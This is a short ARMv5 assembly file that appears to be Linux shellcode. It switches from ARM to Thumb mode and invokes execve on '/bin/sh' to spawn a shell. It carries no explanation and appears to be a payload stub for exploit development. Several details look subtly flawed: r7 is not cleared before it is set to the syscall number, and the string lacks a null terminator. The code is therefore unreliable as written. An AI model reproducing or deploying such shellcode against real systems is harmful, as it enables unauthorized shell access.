@ vim:ft=armv5

.text
.global _start 

_start: 
    .arm 
    add r3, pc, #1 // for thumb mode 
    bx r3 

.thumb 
_exec: 
    add r7,r7,#11 
    add r0, pc, #8
    eor r1,r1,r1
    eor r2,r2,r2 
    swi #1
    nop

_str: .ascii "/bin/sh" 


